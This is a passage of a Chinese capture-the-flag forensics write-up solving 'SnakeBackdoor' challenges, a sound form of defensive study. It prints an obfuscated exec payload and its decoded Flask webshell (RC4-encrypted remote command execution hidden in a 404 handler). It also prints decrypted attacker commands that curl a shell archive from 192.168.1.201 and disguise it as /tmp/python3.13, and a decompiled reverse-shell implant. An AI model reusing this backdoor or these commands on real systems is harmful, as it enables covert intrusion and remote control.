6RAzZBA0smPKRX0DTzWNMvfcQXUas4/E8Mc+J8VT+VdJEV8C20CDbQGvgccEgDMhBSGpOlaGV7n/7ZMogYKHm7t4g7yut+3AjrJWdsn3CPTR1LYaN0ZR1bCI0shBM4rf/lL+DAfC8NPbYp9XXXWW1PpQ63LdWR0BfWW6wrTZPsvRqDCIGk3vxiqS1CrW9UO3ZhgpTLFDs5GaJkBrk7K+Ya6k5f4W9Q7Q9PZXwgHLLH0Yiy6xapD6MF9/kSnPiUmFxr+p/VU0LJLNk4ctueQbkpi1XZX9tejQybyDf2Om2uQdBFwMwg/GBpZjwOZbDxkn4NzYishKnRryRJsM7WqEOWSxVLWPHLJO5pZDMqwaPGl7CdGK9SAdtRS1NOlYJcGMf9Gmj8ckIp8syM4h5HQ+kSZG+TTJKfgBFcJ1y/2BjFKRDxddmKa6AVRiECIVSZQpmtttVB0dxOjMQMrXMuSL0R652hsuw2V0cGnWPiucsnouOTVXMCR1wOn7ebzQA4U9hOqDXMuWCC/a6E/RTwNxV4mRBWgmYIG+3/0qGZhzgMocF2m6+dejIwbCbB7suGjtY8Ck7u9GRBl0btT6TsZi7Da9EkAnsBWn6ti7CmVDHC+4BzhUwFd9ZBcVmhwbIwUcLWXrlLzPAWAbSX+shk5urkfvbepumM2cUWVEFwyLmZWsLbv8TTq8wvMXIweLsZvIHfz9pSWOgNKuYlKqCQegx62bh8oBDy3039OMkbyYgqhYwqCZmRL5JYvuNv728exGCrp3lS55AQ2rhn4vwid4WeNLey3Hch2t5kcadVTlCWgEgM60zcz//w+n33///8s/l5TXX2rlLBWTv9vRzNjCTd6Mw0I+S7EcNmy7Td4Q2qQxuWklVwJe&#x27;))</span><br></pre></td></tr></table></figure>

<p>太麻烦了，自动检测解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auto_deobfuscate</span>(<span class="params">code_str, layer=<span class="number">1</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在尝试第 <span class="subst">&#123;layer&#125;</span> 层解码...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">r&#x27;b[\&#x27;&quot;](.*?)[\&#x27;&quot;]&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, code_str, re.DOTALL)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到符合 b&#x27;...&#x27; 格式的 payload。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> code_str</span><br><span class="line"></span><br><span class="line">    payload_str = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        reversed_payload = payload_str[::-<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b64_decoded = base64.b64decode(reversed_payload)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 反转解码失败，尝试直接 Base64 解码...&quot;</span>)</span><br><span class="line">            b64_decoded = base64.b64decode(payload_str)</span><br><span class="line"></span><br><span class="line">        decompressed_data = zlib.decompress(b64_decoded)</span><br><span class="line">        </span><br><span class="line">        result_code = decompressed_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 第 <span class="subst">&#123;layer&#125;</span> 层解码成功！&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exec(&quot;</span> <span class="keyword">in</span> result_code <span class="keyword">and</span> <span class="string">&quot;b&#x27;&quot;</span> <span class="keyword">in</span> result_code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 检测到嵌套混淆，继续递归...&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> auto_deobfuscate(result_code, layer + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> result_code</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 解码过程中出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">target_code = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">exec((_)(b&#x27;4iby6fw/fff+/TZrG/A6n9TbhtdgedAn1vnr3iehuhbMxwoFVdFehaBVdJBDLi724DwPCiwOi6g3AHipBNJNL20AS7dneoBxk1f6E1OOPM15UKPhCBDZKscrYJsyhPr4A6sJpV5Q8glSoIITVi+UGThwWCz2VjzBLu0WGpEYugizogzry+sNp7NUi39LV7yUulMva3evYFwcpXAo3bbpFpuTKJaGNRQLLRbM1d3Q0CE9iESi1+guE+4A/sOQS256WCY6z5YcRAxo82NM+vQitVf7mCIFFXovlUGR2dDA24QXpBfqJOB91EF+8hC3T5GSlf+sOCslL00UwTOjOtQ+jDo8DGgcQsBb0HI7d9GA6P5HyzxLjaI0X4VsYtzYF62+Bey3qwI7hL349rnAG2ljO6YHwgjFfkSRQabpYEdNF1y90P314LFtUDgHk/vCVCUzE4YRwuKDtvFImE+i05o4+nPbBgMR+EJ6yU1jXz2oevENJ8DqhbeWM4SEd3LVL3yOrIPgWptzPGnUBFRTXojbZW1fvEnNwlcqtKC2SocSGW9H17i2f845D4Td1nZBnmHT/lsCYnvEXxVwzQVUGrYsuQTMs94xtN97F3TEIH996901yraCFDyOK3mhVMGJFG94AJBBWW07VQImOET4TWDvnYcI377IxMx0vNf4/vluxuNGIhzMqlIi1Pw9RSDMpnCUae5XSTrO+Tfm80OtiHp31Nl+yJOr8o8xla2Oln3W2YI7eq8KWGoSn5dWKrfzSgrMWXTkpoOM1sBdqDmdALKdqjYN7eP22LPjj0hQkhJzzoGR7cvKKQpdaAcHKfkFa5aDq1+P/qL+O0ktq8EnM7w7as27LHQ7GL7ko/kYvIPxukGdPx4XUzn+ao5KS5JOXeoW68B5A35HkQ3/XC24WMxtTvphlBFeqb5fo89mVvjKgT8qAwMbOGfK65Mn/IIRNtCS8wXYU+JoQ/LfXXizDaCcEjonZ4Nu5rwUxVqs4Go7YEmTA6Xv/7HJEQui5Js6zV4VkvaH/qTPmy32FPKM0hlw4KqGlIif27+dcu1M+b9BFqg+MYiKGU6yrnrQZTapf6BElCdzodsf/L9EdFlQyTlQcSHPnleMAfPXoDH0ONtcfY5UDCSvaydQVz+Tm2jo33XEIGNG04NqPC6FgSyOtbNJfoXHSczUJEJlaZrfTMS673GEJUHBf4w5PaKIA7NjuX1h6h4FUbAuN5ibuyApYgqrKgO4cBIaG0SieI7A0P31Z5zz0ovzVJE0FmNRxjClveQ/XsxSQtDFosaOuFHxsjm6PdFyZiTahNWmf5LF7YSu8JH6nRYaodHV5iPHO3EdW9UzuYx0yZ3tx/elgs23gNfalwRNWv4yb2MeJZTcBZCS5Up6/pRe3J/2b+ZTLmQwMD4+0IZKWXkzMESX0QaBq+Csrrx8CV3LZPY6299N2JXLGKAZtMbJrHF9e/xBAEBEAFsc51aVdHO8jSqusCZmd/iEqzuw1vrH90N/d9zDVGpSIvtBTzh3FtlZGH/eoRtXFazv1tMPaQrV3YcH2XkR+pFup++O96ZZR87Aws7Bf2yLKa7tWoMlBiQXiNrRqmFLCecnV3Un5kKoAXLzFST16yHFtaCQEUaB3CvIdA6r09NK80OA1p7R90M4U7ybXedZFcNJ3Md4pFNj0y7ZMApp1NyEm3LPhSZh4panfHR5KW9BGOSWYB9NLWDCDWNNa4VLdZenURheicdHZzkVyaixBMf7NRlVhntSlTuT1Q9U+V4owhUh75SfYEKJC7S9pY+vyVsq//tHU5GsFZwOr6Whlsa+jf+nevChveOxUrD0g1YRLtFsaFuWHRuHL6+Ywi4uoqx0LCt9h/KmXXFVi6eTFKjiC4C63nE+APQYmbdTEulb5bcrnOGdkOYlhp+4nQAGE+6lrs6L8+9LifLjLP7Z1XhZxhcHCJFbx3CEo0YxxcgPCeJ7IiyEl38o0go6MfmAJ25kLa4UwJkq7FT4RU5lf/gJ1oPOO+rJnzvnECHiEOjxqy+gXg9iBv4M8B8qI5koyGDB6RAzZBA0smPKRX0DTzWNMvfcQXUas4/E8Mc+J8VT+VdJEV8C20CDbQGvgccEgDMhBSGpOlaGV7n/7ZMogYKHm7t4g7yut+3AjrJWdsn3CPTR1LYaN0ZR1bCI0shBM4rf/lL+DAfC8NPbYp9XXXWW1PpQ63LdWR0BfWW6wrTZPsvRqDCIGk3vxiqS1CrW9UO3ZhgpTLFDs5GaJkBrk7K+Ya6k5f4W9Q7Q9PZXwgHLLH0Yiy6xapD6MF9/kSnPiUmFxr+p/VU0LJLNk4ctueQbkpi1XZX9tejQybyDf2Om2uQdBFwMwg/GBpZjwOZbDxkn4NzYishKnRryRJsM7WqEOWSxVLWPHLJO5pZDMqwaPGl7CdGK9SAdtRS1NOlYJcGMf9Gmj8ckIp8syM4h5HQ+kSZG+TTJKfgBFcJ1y/2BjFKRDxddmKa6AVRiECIVSZQpmtttVB0dxOjMQMrXMuSL0R652hsuw2V0cGnWPiucsnouOTVXMCR1wOn7ebzQA4U9hOqDXMuWCC/a6E/RTwNxV4mRBWgmYIG+3/0qGZhzgMocF2m6+dejIwbCbB7suGjtY8Ck7u9GRBl0btT6TsZi7Da9EkAnsBWn6ti7CmVDHC+4BzhUwFd9ZBcVmhwbIwUcLWXrlLzPAWAbSX+shk5urkfvbepumM2cUWVEFwyLmZWsLbv8TTq8wvMXIweLsZvIHfz9pSWOgNKuYlKqCQegx62bh8oBDy3039OMkbyYgqhYwqCZmRL5JYvuNv728exGCrp3lS55AQ2rhn4vwid4WeNLey3Hch2t5kcadVTlCWgEgM60zcz//w+n33///8s/l5TXX2rlLBWTv9vRzNjCTd6Mw0I+S7EcNmy7Td4Q2qQxuWklVwJe&#x27;)&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--- 开始自动化去混淆 ---&quot;</span>)</span><br><span class="line">final_code = auto_deobfuscate(target_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> final_code:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[V] 最终结果如下:\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(final_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br></pre></td></tr></table></figure>

<p>得到以下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> exc_class</span><br><span class="line"><span class="keyword">global</span> code</span><br><span class="line"><span class="keyword">import</span> os,binascii</span><br><span class="line">exc_class, code = app._get_exc_class_and_code(<span class="number">404</span>)</span><br><span class="line">RC4_SECRET = <span class="string">b&#x27;v1p3r_5tr1k3_k3y&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">                S[i], S[j] = S[j], S[i]</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        res = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">                i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">                j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">                S[i], S[j] = S[j], S[i]</span><br><span class="line">                res.append(char ^ S[(S[i] + S[j]) % <span class="number">256</span>])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor_handler</span>():</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;X-Token-Auth&#x27;</span>) != <span class="string">&#x27;3011aa21232beb7504432bfa90d32779&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line">        enc_hex_cmd = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> enc_hex_cmd:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                enc_cmd = binascii.unhexlify(enc_hex_cmd)</span><br><span class="line">                cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                output_bytes = <span class="built_in">getattr</span>(os, <span class="string">&#x27;popen&#x27;</span>)(cmd).read().encode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                enc_output = rc4_crypt(output_bytes, RC4_SECRET)</span><br><span class="line">                <span class="keyword">return</span> binascii.hexlify(enc_output).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Error&quot;</span></span><br><span class="line">app.error_handler_spec[<span class="literal">None</span>][code][exc_class]=<span class="keyword">lambda</span> error: backdoor_handler()</span><br></pre></td></tr></table></figure>

<p>得到v1p3r_5tr1k3_k3y</p>
<p>flag{v1p3r_5tr1k3_k3y}</p>
<h3 id="SnakeBackdoor-4"><a href="#SnakeBackdoor-4" class="headerlink" title="SnakeBackdoor-4"></a>SnakeBackdoor-4</h3><p>题目内容：</p>
<blockquote>
<p>攻击者上传了一个二进制后门，请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径</p>
</blockquote>
<p>从3中可以看到他要对data数据进行解rc4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">data=a6bc</span><br><span class="line">结果为 id</span><br><span class="line"></span><br><span class="line">data=a3ab330fb285</span><br><span class="line">结果为 ls -al</span><br><span class="line"></span><br><span class="line">data=e0ac7e52fc996cc2038c2d7a3899ed</span><br><span class="line">结果为 /tmp/python3.13</span><br><span class="line"></span><br><span class="line">data=acb07e4db7c93ece4bcc37246687ae0649614caa3430ce4b</span><br><span class="line">结果为 chmod +x /tmp/python3.13</span><br><span class="line"></span><br><span class="line">data=a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351</span><br><span class="line">结果为 mv /tmp/shell /tmp/python3.13</span><br><span class="line"></span><br><span class="line">data=bab6694ba3c938e64b8d257b7cccee460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a</span><br><span class="line">结果为 unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip</span><br><span class="line"></span><br><span class="line">data=acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534</span><br><span class="line">结果为 curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip</span><br></pre></td></tr></table></figure>

<p>从上面结果容易看出来本体文件名称为python3.13</p>
<p>flag{python3.13}</p>
<h3 id="SnakeBackdoor-5"><a href="#SnakeBackdoor-5" class="headerlink" title="SnakeBackdoor-5"></a>SnakeBackdoor-5</h3><p>题目内容：</p>
<blockquote>
<p>请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥（hex，小写字母），结果提交形式：flag{[0-9a-f]+}</p>
</blockquote>
<p>从unzip -P nf2jd092jd01 -d &#x2F;tmp &#x2F;tmp&#x2F;123.zip可知解压密码为<strong>nf2jd092jd01</strong>，解压得到shell文件，用ida打开，查看main函数</p>
<p><img src="https://pic1.imgdb.cn/item/6951012ea0c391c56de5e2ca.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int v5; // [rsp+4h] [rbp-115Ch] BYREF</span><br><span class="line">  unsigned int v6; // [rsp+8h] [rbp-1158h] BYREF</span><br><span class="line">  unsigned int v7; // [rsp+Ch] [rbp-1154h] BYREF</span><br><span class="line">  _DWORD v8[4]; // [rsp+10h] [rbp-1150h] BYREF</span><br><span class="line">  _BYTE v9[128]; // [rsp+20h] [rbp-1140h] BYREF</span><br><span class="line">  _BYTE v10[128]; // [rsp+A0h] [rbp-10C0h] BYREF</span><br><span class="line">  char command[4096]; // [rsp+120h] [rbp-1040h] BYREF</span><br><span class="line">  struct sockaddr s; // [rsp+1120h] [rbp-40h] BYREF</span><br><span class="line">  int v13; // [rsp+1134h] [rbp-2Ch]</span><br><span class="line">  int v14; // [rsp+1138h] [rbp-28h]</span><br><span class="line">  int v15; // [rsp+113Ch] [rbp-24h]</span><br><span class="line">  FILE *stream; // [rsp+1140h] [rbp-20h]</span><br><span class="line">  int v17; // [rsp+1148h] [rbp-18h]</span><br><span class="line">  unsigned int seed; // [rsp+114Ch] [rbp-14h]</span><br><span class="line">  int fd; // [rsp+1150h] [rbp-10h]</span><br><span class="line">  int j; // [rsp+1154h] [rbp-Ch]</span><br><span class="line">  int v21; // [rsp+1158h] [rbp-8h]</span><br><span class="line">  int i; // [rsp+115Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  fd = socket(2, 1, 0);</span><br><span class="line">  if ( fd &lt; 0 )</span><br><span class="line">    exit(1);</span><br><span class="line">  memset(&amp;s, 48, sizeof(s));</span><br><span class="line">  s.sa_family = 2;</span><br><span class="line">  *(_DWORD *)&amp;s.sa_data[2] = inet_addr(&quot;192.168.1.201&quot;);</span><br><span class="line">  *(_WORD *)s.sa_data = htons(0xE59Eu);</span><br><span class="line">  if ( connect(fd, &amp;s, 0x10u) &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( (unsigned int)sub_18ED((unsigned int)fd, &amp;v7, 4, 0) != 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  seed = (v7 &gt;&gt; 8) &amp; 0xFF00 | (v7 &lt;&lt; 8) &amp; 0xFF0000 | (v7 &lt;&lt; 24) | HIBYTE(v7);</span><br><span class="line">  srand(seed);</span><br><span class="line">  for ( i = 0; i &lt;= 3; ++i )</span><br><span class="line">    v8[i] = rand();</span><br><span class="line">  sub_13B4(v10, v8, 0);</span><br><span class="line">  sub_13B4(v9, v8, 1);</span><br><span class="line">  while ( (unsigned int)sub_18ED((unsigned int)fd, &amp;v6, 4, 0) == 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (v6 &gt;&gt; 8) &amp; 0xFF00 | (v6 &lt;&lt; 8) &amp; 0xFF0000 | (v6 &lt;&lt; 24) | HIBYTE(v6);</span><br><span class="line">    if ( v6 &lt;= 0x1000 &amp;&amp; v6 &amp;&amp; (v6 &amp; 0xF) == 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = sub_18ED((unsigned int)fd, command, v6, 0);</span><br><span class="line">      if ( v21 != v6 )</span><br><span class="line">        break;</span><br><span class="line">      sub_1860(v10, 0, command, command, v21);</span><br><span class="line">      v17 = (unsigned __int8)command[v21 - 1];</span><br><span class="line">      if ( v17 &amp;&amp; v17 &lt;= 16 )</span><br><span class="line">        command[v21 - v17] = 0;</span><br><span class="line">      else</span><br><span class="line">        command[v21] = 0;</span><br><span class="line">      stream = popen(command, &quot;r&quot;);</span><br><span class="line">      if ( stream )</span><br><span class="line">      &#123;</span><br><span class="line">        v21 = fread(command, 1u, 0xFFFu, stream);</span><br><span class="line">        pclose(stream);</span><br><span class="line">        command[v21] = 0;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        strcpy(command, &quot;popen failed\n&quot;);</span><br><span class="line">        v21 = strlen(command);</span><br><span class="line">      &#125;</span><br><span class="line">      v15 = v21;</span><br><span class="line">      v14 = 16 * (v21 / 16 + 1);</span><br><span class="line">      v13 = v14 - v21;</span><br><span class="line">      for ( j = v21; j &lt; v14; command[j++] = v13 )</span><br><span class="line">        ;</span><br><span class="line">      sub_1860(v9, 1, command, command, v14);</span><br><span class="line">      v5 = (v14 &gt;&gt; 8) &amp; 0xFF00 | (v14 &lt;&lt; 8) &amp; 0xFF0000 | (v14 &lt;&lt; 24) | (v14 &gt;&gt; 24);</span><br><span class="line">      if ( (unsigned int)sub_197F((unsigned int)fd, &amp;v5, 4, 0) != 4 )</span><br><span class="line">        break;</span><br><span class="line">      v3 = sub_197F((unsigned int)fd, command, v14, 0);</span><br><span class="line">      if ( v14 != v3 )</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中seed的值是关键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub_18ED((unsigned int)fd, &amp;v7, 4, 0);</span><br><span class="line">seed = (v7 &gt;&gt; 8) &amp; 0xFF00 | (v7 &lt;&lt; 8) &amp; 0xFF0000 | (v7 &lt;&lt; 24) | HIBYTE(v7);</span><br><span class="line">srand(seed);</span><br></pre></td></tr></table></figure>

<p>回到流量包查找该值，发现为34952046</p>
<blockquote>
<p>为什么是tcp流1827</p>
<p>因为由data&#x3D;e0ac7e52fc996cc2038c2d7a3899ed，结果为 &#x2F;tmp&#x2F;python3.13，该步骤执行在tcp流1826</p>
</blockquote>
<p><img src="https://pic1.imgdb.cn/item/6951031ca0c391c56de5e2e5.png"></p>
<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  uint32_t v8[4];</span><br><span class="line">  srand(0x34952046);</span><br><span class="line">  for (int i = 0; i &lt;= 3; ++i )</span><br><span class="line">    v8[i] = rand();</span><br><span class="line">  for(int i = 0; i &lt; 4; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;%x&quot;,v8[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到61fb46ac4f3b310b2d64fc3256b43488</p>
<p>在逆向工程和内存取证中，整数在 x86&#x2F;x64 内存中是<strong>小端序 (Little-Endian)</strong> 存储的，经过换序得到：</p>
<p>flag{ac46fb610b313b4f32fc642d8834b456}</p>
<h3 id="SnakeBackdoor-6"><a href="#SnakeBackdoor-6" class="headerlink" title="SnakeBackdoor-6"></a>SnakeBackdoor-6</h3><p><img src="https://pic1.imgdb.cn/item/6951031ca0c391c56de5e2e5.png"></p>
<p>可以看到这其实也是data数据</p>
<p><img src="C:\Users\jiucheng\AppData\Roaming\Typora\typora-user-images\image-20251228185236603.png" alt="image-20251228185236603"></p>
<p>从tcp流1827中提取出加密的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">49b351855f211b85bd012f80ce8ed5b3</span><br><span class="line">2cc5becb37ca595a89445461c6512efc</span><br><span class="line">b863696da0c6bb28da46e09069dd644f</span><br><span class="line">87e8faa921f3e67c530f1b6740a9d439794e426716d49f5e949d5d56f81ed54a97f6cc6752fcf7aa408a94e6a59029e7</span><br><span class="line">b7c88bb0d92308a57f83d08a90ae024c</span><br><span class="line">4331cfda21eeab8922fcc7acced16d1a17b02e8d2d9dfee48dc8f18e0dbbb2e4c4547e39d8c4aa2418d9fca52c9c4770</span><br><span class="line">7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729</span><br></pre></td></tr></table></figure>

<p>根据shell写出解密脚本（来源于我的队友）：</p>
